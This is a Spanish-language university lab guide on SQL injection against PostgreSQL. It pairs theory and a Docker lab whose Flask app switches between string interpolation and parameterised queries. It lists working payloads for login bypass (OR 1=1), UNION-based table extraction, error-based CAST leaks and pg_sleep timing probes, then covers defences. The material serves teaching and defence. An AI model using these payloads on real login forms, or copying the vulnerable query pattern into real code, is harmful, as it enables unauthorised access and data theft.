# Guía Académica de Laboratorio: Análisis y Mitigación de Inyección SQL
**Asignatura:** Bases de Datos II  
**Objetivo:** Comprender la anatomía, clasificación teórica, experimentación controlada y mitigación de vulnerabilidades de Inyección SQL (CWE-89) en motores relacionales (PostgreSQL).

---

## 1. Fundamentos Teóricos

### 1.1 ¿Qué es la Inyección SQL?
La inyección de lenguaje de consulta estructurado (SQL Injection o SQLi) ocurre cuando una aplicación interpreta datos proporcionados por el usuario como parte de la sintaxis ejecutable de una consulta, en lugar de tratarlos exclusivamente como datos literales.

En los sistemas gestores de bases de datos relacionales (SGBD), el motor procesa las consultas a través de varias etapas:
1. **Analizador Léxico y Sintáctico (Parser):** Lee el flujo de caracteres y valida que cumpla con la gramática SQL formal, construyendo un árbol de análisis sintáctico (*parse tree*).
2. **Analizador Semántico:** Valida que las tablas, columnas, funciones y tipos de datos existan y que el usuario tenga los privilegios necesarios.
3. **Planificador / Optimizador de Consultas:** Diseña las estrategias de acceso a datos (escaneos secuenciales, búsquedas por índices, algoritmos de unión como hash join o nested loop).
4. **Motor de Ejecución:** Ejecuta el plan y devuelve el conjunto de resultados.

Cuando el código fuente utiliza concatenación dinámica de cadenas (por ejemplo, `query = "SELECT ... WHERE user = '" + input + "'"`), el usuario puede introducir caracteres de control de la gramática SQL (como comillas simples `'`, delimitadores `;`, comentarios `--` u operadores relacionales `UNION`, `OR`, `AND`). Esto altera el árbol sintáctico durante la fase de análisis léxico, cambiando por completo la lógica de la consulta prevista por el desarrollador.

---

## 2. Taxonomía de Inyecciones SQL

La literatura en seguridad informática y organizaciones como OWASP clasifican las inyecciones SQL en tres grandes familias según el canal de comunicación y el método de extracción de información:

```
                    ┌─────────────────────────────────────────┐
                    │      Familias de Inyección SQL          │
                    └────────────────────┬────────────────────┘
                                         │
         ┌───────────────────────────────┼───────────────────────────────┐
         │                               │                               │
         ▼                               ▼                               ▼
┌──────────────────┐           ┌──────────────────┐           ┌──────────────────┐
│  1. EN BANDA     │           │  2. INFERENCIAL  │           │ 3. FUERA DE BANDA│
│    (In-Band)     │           │     (Blind)      │           │      (OOB)       │
└────────┬─────────┘           └────────┬─────────┘           └────────┬─────────┘
         │                              │                              │
    ┌────┴────┐                    ┌────┴────┐                         │
    │         │                    │         │                         ▼
    ▼         ▼                    ▼         ▼               Conexiones salientes
 Basada    Basada               Basada    Basada             iniciadas por el SGBD
en Error  en UNION            Booleana  en Tiempo             (DNS / HTTP / SMB)
```

---

### 2.1 Inyección SQL En Banda (In-Band / Classic SQLi)
Es la forma más directa. Ocurre cuando el canal utilizado para enviar la consulta es el mismo canal por el que la aplicación responde directamente con los datos o los errores generados por el SGBD.

#### A. Basada en Unión (UNION-Based)
Aprovecha el operador `UNION` de SQL para fusionar el conjunto de resultados de la consulta legítima con una consulta arbitraria definida por el usuario.
* **Reglas del estándar SQL:**
  1. Ambas consultas combinadas con `UNION` deben devolver exactamente el **mismo número de columnas**.
  2. Los **tipos de datos** de las columnas correspondientes deben ser compatibles entre sí.
* **Mecanismo:** Si una consulta de autenticación selecciona 4 columnas (`id`, `username`, `role`, `email`), una cláusula de unión debe proporcionar 4 valores con tipos compatibles para integrarse en la respuesta tabular.

#### B. Basada en Errores (Error-Based)
Ocurre cuando la aplicación web expone directamente en la interfaz los mensajes de error devueltos por el motor de base de datos.
* **Mecanismo:** Se fuerzan fallos intencionales en el motor (por ejemplo, conversiones de tipos no válidas o desbordamientos matemáticos) donde el contenido del error incluye la información que se desea inspeccionar.
* **Comportamiento en PostgreSQL:** Funciones de casteo de tipos como `CAST(expresion AS integer)` generarán un error en tiempo de ejecución si la expresión devuelve texto, reflejando el texto en el mensaje de error del sistema (código SQLSTATE 22P02).

---

### 2.2 Inyección SQL Inferencial (Blind / A Ciegas)
Ocurre cuando la aplicación web es vulnerable a la alteración del árbol sintáctico, pero **no refleja directamente los datos de la base de datos ni los mensajes de error** en las respuestas HTTP. La información se deduce mediante inferencias lógicas.

#### A. Inferencial Booleana (Boolean-Based Blind)
* **Concepto:** Se inyectan condiciones lógicas evaluables como `VERDADERO` o `FALSO`.
* **Mecanismo:** La aplicación responderá de forma ligeramente diferente si la condición es verdadera (por ejemplo, cargando la sesión, mostrando un mensaje de bienvenida o un código HTTP 200) versus si es falsa (mensaje de credenciales inválidas o código HTTP 401).
* **Extracción de datos:** Al formular preguntas booleanas (por ejemplo: "¿el primer carácter del nombre de usuario es la letra 'a'?"), se puede reconstruir cualquier dato carácter por carácter mediante búsqueda binaria o iterativa.

#### B. Inferencial Basada en Tiempo (Time-Based Blind)
* **Concepto:** Cuando la aplicación devuelve exactamente la misma respuesta visual tanto para condiciones verdaderas como falsas, el único canal observable es el tiempo de procesamiento del servidor.
* **Mecanismo:** Se utiliza una función de pausa en el motor condicionada a una expresión lógica.
  * En PostgreSQL, la función `pg_sleep(segundos)` suspende el proceso de ejecución.
  * Si la condición evaluada es verdadera, el motor ejecuta la pausa y la respuesta tarda $N$ segundos en llegar al cliente.
  * Si la condición es falsa, el motor omite la pausa y responde inmediatamente en milisegundos.
* **Métrica observable:** El tiempo de ida y vuelta de la solicitud HTTP (RTT).

---

### 2.3 Inyección SQL Fuera de Banda (Out-of-Band / OOB SQLi)
Se recurre a este enfoque cuando:
1. El canal en banda está completamente cerrado (no hay salida visual de datos ni errores).
2. Los métodos inferenciales son inestables o están bloqueados por límites de tiempo estrictos (*timeouts*) o balanceadores de carga.

* **Concepto:** La consulta inyectada instruye al propio servidor de bases de datos para que inicie una conexión de red externa hacia un servidor bajo control del analista (por ejemplo, mediante una consulta DNS, petición HTTP o conexión SMB).
* **Mecanismo:** La información a extraer se incrusta en la solicitud saliente (por ejemplo, como subdominio en una consulta DNS o como parámetro en una petición HTTP).
* **Condiciones previas requeridas:**
  - El motor de base de datos debe tener habilitadas funciones o extensiones capaces de interactuar con la pila de red del sistema operativo.
  - La infraestructura de red debe permitir el tráfico de salida (*egress traffic*) desde el contenedor o servidor de la base de datos hacia el destino.
  - El usuario de la base de datos debe contar con privilegios elevados para ejecutar dichas funciones.

---

## 3. Arquitectura del Laboratorio Aislado

El entorno de pruebas está diseñado como una solución modular con Docker Compose, completamente aislada en una red bridge privada:

```
                  Red Interna Docker ("labnet")
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│   ┌─────────────────────┐         ┌─────────────────────┐   │
│   │    Contenedor       │         │    Contenedor       │   │
│   │    Flask App        │◄───────►│    PostgreSQL 16    │   │
│   │   (Python 3.12)     │         │       (SGBD)        │   │
│   │   Puerto: 5000      │         │   Puerto: 5432      │   │
│   └──────────▲──────────┘         └─────────────────────┘   │
│              │                                              │
└──────────────┼──────────────────────────────────────────────┘
               │ Puerto 5000 expuesto a localhost
               ▼
   Navegador Web del Estudiante
   http://localhost:5000
```

### Componentes:
- **`app` (Flask):** Expone la interfaz web y contiene dos mecanismos de consulta conmutables:
  - *Modo Vulnerable:* Utiliza interpolación de cadenas `f"SELECT ... '{username}' ..."` para ilustrar el fallo de diseño.
  - *Modo Seguro:* Utiliza consultas parametrizadas `%s` para demostrar la separación estricta entre código y datos.
  - *Inspector de Base de Datos:* Muestra la sentencia SQL final enviada al motor, el cronómetro de ejecución de alta resolución en milisegundos y las excepciones SQLSTATE.
- **`db` (PostgreSQL 16):** Contiene el esquema de usuarios y registros académicos precargados en `init.sql`.

---

## 4. Despliegue del Laboratorio

### 4.1 Requisitos Previos
Tener instalados Docker y Docker Compose en el sistema:
```bash
docker --version
docker compose version
```

### 4.2 Instrucciones de Puesta en Marcha

1. **Navegar a la carpeta del proyecto:**
   ```bash
   cd /home/nokia/tools/sql_inyection
   ```

2. **Compilar y levantar los contenedores en segundo plano:**
   ```bash
   docker compose up --build -d
   ```

3. **Verificar que los servicios se encuentren en estado *healthy* / *running*:**
   ```bash
   docker compose ps
   ```

4. **Abrir el laboratorio en el navegador:**
   Acceder a [http://localhost:5000](http://localhost:5000).

5. **Visualizar los registros (logs) del entorno:**
   ```bash
   # Ver logs continuos de la aplicación web
   docker compose logs -f app

   # Ver logs del motor de base de datos PostgreSQL
   docker compose logs -f db
   ```

6. **Detener y limpiar el entorno al finalizar la práctica:**
   ```bash
   docker compose down -v
   ```

---

## 5. Guía de Experimentación y Observación Académica

La aplicación vulnerable procesa internamente la autenticación mediante la siguiente plantilla de consulta:
```sql
SELECT id, username, role, email FROM users WHERE username = '{username}' AND password = '{password}'
```
A continuación se detalla cada experimento práctico, los valores exactos a introducir en el formulario, el desglose sintáctico de la consulta resultante y lo que se debe observar en el **Inspector de Base de Datos**.

---

### 5.1 Prueba 1: Alteración Lógica y Bypass Booleano (Boolean-Based)

* **Objetivo:** Demostrar cómo los operadores booleanos (`OR`) y los comentarios de línea (`--`) alteran la evaluación lógica de la cláusula `WHERE`, prescindiendo de la validación de contraseñas.
* **Configuración inicial:** Selector en **Concatenación Directa (Vulnerable)**.

#### Paso A: Condición Universalmente Verdadera (Tautología)
1. **Campos del formulario:**
   - **Nombre de Usuario:** `' OR 1=1 --`
   - **Contraseña:** `cualquiera` (p. ej. `test`)
2. **Consulta reconstruida en el motor:**
   ```sql
   SELECT id, username, role, email FROM users WHERE username = '' OR 1=1 --' AND password = 'test'
   ```
3. **Desglose de tokens:**
   - `'`: Cierra prematuramente el literal de cadena asignado a `username`.
   - `OR 1=1`: Introduce una condición tautológica siempre verdadera para cada registro evaluado.
   - `--`: Comenta el resto de la consulta original, descartando completamente la comprobación del campo `password`.
4. **Observación en el Inspector:**
   - **Estado:** Cambia a <span style="color:#10b981; font-weight:bold;">Autenticado</span>.
   - **Tabla de resultados:** El motor retorna todas las filas de la tabla `users` al evaluarse la condición como verdadera para todos los registros.
   - **Tiempo de respuesta:** Inmediato (< 20 ms).

#### Paso B: Condición Contradictoria (Falsedad)
1. **Campos del formulario:**
   - **Nombre de Usuario:** `' OR 1=2 --`
   - **Contraseña:** `test`
2. **Consulta reconstruida:**
   ```sql
   SELECT id, username, role, email FROM users WHERE username = '' OR 1=2 --' AND password = 'test'
   ```
3. **Observación en el Inspector:**
   - **Estado:** Cambia a <span style="color:#f59e0b; font-weight:bold;">Rechazado</span> ("Credenciales incorrectas").
   - **Conclusión de inferencia:** La diferencia entre la respuesta de un predicado verdadero vs. falso permite a un analista inferir cualquier dato de la base de datos carácter por carácter formulando preguntas booleanas.

---

### 5.2 Prueba 2: Inyección En Banda por Unión (UNION-Based)

* **Objetivo:** Combinar el conjunto de resultados de la consulta original con registros arbitrarios mediante el operador `UNION`, cumpliendo con las reglas de aridad (4 columnas) y tipos de datos del estándar SQL.
* **Consulta base:** Proyecta **4 columnas**: `id` (entero), `username` (texto), `role` (texto), `email` (texto).

#### Opción A: Inyección Directa con Literales Sintéticos (Recomendada - Sin depender de tablas externas)
Esta prueba siempre funciona independientemente del contenido de las tablas secundarias, ya que genera una tupla sintética al vuelo:
1. **Campos del formulario:**
   - **Nombre de Usuario:** `' UNION SELECT 999, 'usuario_inyectado', 'administrador', 'inyectado@lab.local' --`
   - **Contraseña:** `test`
2. **Consulta reconstruida en el motor:**
   ```sql
   SELECT id, username, role, email FROM users WHERE username = '' UNION SELECT 999, 'usuario_inyectado', 'administrador', 'inyectado@lab.local' --' AND password = 'test'
   ```
3. **Observación en el Inspector:**
   - **Estado:** Cambia a <span style="color:#10b981; font-weight:bold;">Autenticado</span>.
   - **Tabla de resultados:** El inspector muestra la tupla inyectada con ID `999`, usuario `usuario_inyectado` y rol `administrador`.

#### Opción B: Extracción de la Tabla `users`
1. **Campos del formulario:**
   - **Nombre de Usuario:** `' UNION SELECT id, username, role, email FROM users --`
   - **Contraseña:** `test`
2. **Observación en el Inspector:**
   - **Estado:** <span style="color:#10b981; font-weight:bold;">Autenticado</span>.
   - **Tabla de resultados:** Muestra todos los usuarios registrados en el sistema (`admin`, `prof_garcia`, `estudiante1`).

#### Opción C: Extracción de la Tabla Secundaria `academic_records`
*(Nota: Requiere que la tabla `academic_records` contenga filas. Si tu contenedor se creó con un volumen previo vacío, reinicia con `docker compose down -v && docker compose up -d` para recargar el esquema de `init.sql`).*
1. **Campos del formulario:**
   - **Nombre de Usuario:** `' UNION SELECT id, student_username, subject, comments FROM academic_records --`
   - **Contraseña:** `test`
2. **Observación en el Inspector:**
   - **Registros Retornados:** Muestra las materias y notas académicas proyectadas en la tabla de usuarios.

#### Comprobación del Fallo de Aridad
1. **Campos del formulario:**
   - **Nombre de Usuario:** `' UNION SELECT 1, 'incompleto' --`
   - **Contraseña:** `test`
2. **Observación en el Inspector:**
   - **Estado:** <span style="color:#f43f5e; font-weight:bold;">Excepción SQL</span> (`each UNION query must have the same number of columns`).

---

### 5.3 Prueba 3: Inyección En Banda Basada en Error (Error-Based)

* **Objetivo:** Forzar una excepción de conversión de tipos de datos en tiempo de ejecución (`CAST`) para que el SGBD incluya información confidencial dentro del mensaje de error expuesto.

1. **Campos del formulario:**
   - **Nombre de Usuario:** `' AND 1=CAST((SELECT current_database()) AS int) --`
   - **Contraseña:** `test`
2. **Consulta reconstruida en el motor:**
   ```sql
   SELECT id, username, role, email FROM users WHERE username = '' AND 1=CAST((SELECT current_database()) AS int) --' AND password = 'test'
   ```
3. **Mecanismo:** La función `current_database()` devuelve el texto `'labdb'`. Al intentar forzar la conversión de `'labdb'` a tipo entero (`int`), el motor aborta la ejecución con un error tipado.
4. **Observación en el Inspector:**
   - **Estado:** <span style="color:#f43f5e; font-weight:bold;">Excepción SQL</span>.
   - **Código SQLSTATE:** `22P02` (*invalid_text_representation*).
   - **Mensaje capturado:** `invalid input syntax for type integer: "labdb"`.
   - **Conclusión:** El nombre de la base de datos actual (`labdb`) es expuesto directamente en el mensaje de error devuelto por PostgreSQL.

---

### 5.4 Prueba 4: Inyección Inferencial Basada en Tiempo (Time-Based)

* **Objetivo:** Deducir información del motor de base de datos cuando la aplicación no devuelve datos visuales ni mensajes de error, utilizando el tiempo de procesamiento como canal secundario de información.

#### Paso A: Retardo Forzado (Condición Verdadera)
1. **Campos del formulario:**
   - **Nombre de Usuario:** `' OR (SELECT pg_sleep(3)) IS NULL --`
   - **Contraseña:** `test`
2. **Consulta reconstruida en el motor:**
   ```sql
   SELECT id, username, role, email FROM users WHERE username = '' OR (SELECT pg_sleep(3)) IS NULL --' AND password = 'test'
   ```
3. **Mecanismo:** La función `pg_sleep(3)` suspende la ejecución durante 3 segundos. Al evaluarse la cláusula disyuntiva, el motor ejecuta la función de pausa antes de devolver la respuesta HTTP.
4. **Observación en el Inspector:**
   - **Tiempo de Respuesta:** El cronómetro registrará un tiempo superior a **`3000.00 ms`** (3 segundos) y el badge se resaltará en rojo.

#### Paso B: Verificación sin Retardo (Línea Base)
1. **Campos del formulario:**
   - **Nombre de Usuario:** `estudiante1`
   - **Contraseña:** `Estudiante123`
2. **Observación en el Inspector:**
   - **Tiempo de Respuesta:** Vuelve a su rango nominal ordinario (**< 15.00 ms**).
   - **Conclusión:** La variación drástica y medible en el cronómetro confirma que la función de retardo fue procesada por el motor relacional.

---

### 5.5 Prueba 5: Validación Defensiva con Consultas Parametrizadas

* **Objetivo:** Demostrar cómo las consultas preparadas (*Prepared Statements*) neutralizan de raíz todas las modalidades de inyección probadas anteriormente.

1. **Configuración:** Cambiar el selector a **Consulta Parametrizada (Segura)**.
2. **Campos del formulario:** Introducir cualquiera de las entradas utilizadas en las pruebas 1, 2, 3 o 4 (por ejemplo, `' OR 1=1 --`).
3. **Consulta procesada:**
   ```sql
   SELECT id, username, role, email FROM users WHERE username = %s AND password = %s
   [Parámetros vinculados: username="' OR 1=1 --", password="test"]
   ```
4. **Observación en el Inspector:**
   - **Estado:** <span style="color:#9ca3af; font-weight:bold;">Rechazado</span> ("Credenciales incorrectas: ningún registro coincide").
   - **Tiempo de respuesta:** < 10 ms (sin retrasos).
   - **Excepciones SQL:** Ninguna.
5. **Explicación técnica:**
   El driver de PostgreSQL envía la plantilla SQL y los datos en paquetes de protocolo separados. El motor compila el árbol sintáctico una sola vez con los marcadores de posición (`%s`). Cuando los datos llegan posteriormente, el analizador léxico jamás los interpreta como palabras reservadas (`OR`, `UNION`, `CAST`), sino como una búsqueda literal de un usuario cuya cadena de texto contenga literalmente las comillas y guiones.

---

## 6. Estrategias de Mitigación y Buenas Prácticas Defensivas

### 6.1 Consultas Preparadas con Parámetros Tipados (Prepared Statements)
Es la defensa primaria y más efectiva contra la inyección SQL.
* **Cómo funciona:** La consulta se envía al motor en dos fases separadas:
  1. *Fase de Compilación:* El motor analiza la plantilla sintáctica con marcadores de posición (`%s` o `$1, $2`). El árbol sintáctico se compila y optimiza de forma definitiva.
  2. *Fase de Ejecución:* Los valores de los parámetros se transmiten como datos puros.
* **Resultado:** El analizador sintáctico jamás reevalúa los datos del usuario como código SQL, imposibilitando la inyección independientemente de los caracteres introducidos.

```python
# Ejemplo en Python con psycopg2 (DEFENSA CORRECTA)
query = "SELECT id, username, role FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))
```

### 6.2 Uso de Mapeadores Objeto-Relacionales (ORM)
Frameworks modernos como SQLAlchemy, Django ORM o Hibernate implementan consultas parametrizadas de forma transparente:
```python
# Uso seguro mediante ORM
user = session.query(User).filter_by(username=username, password=password).first()
```

### 6.3 Principio de Mínimo Privilegio (Principle of Least Privilege - PoLP)
A nivel de infraestructura de base de datos:
- El usuario con el que la aplicación se conecta a la base de datos **nunca debe ser superusuario** (`postgres`, `sa` o `root`).
- Se deben revocar permisos sobre catálogos del sistema, funciones administrativas y procedimientos del sistema operativo.
- El usuario solo debe poseer permisos estrictamente necesarios (`SELECT`, `INSERT`, `UPDATE`) sobre las tablas de su dominio de aplicación.

### 6.4 Egress Filtering y Seguridad de Red
Para neutralizar vectores fuera de banda (OOB):
- El servidor de bases de datos debe ubicarse en una subred privada sin acceso directo a Internet.
- Se deben aplicar reglas de firewall estrictas de denegación por defecto (*default-deny*) para cualquier conexión de red saliente iniciada desde el servidor de base de datos.
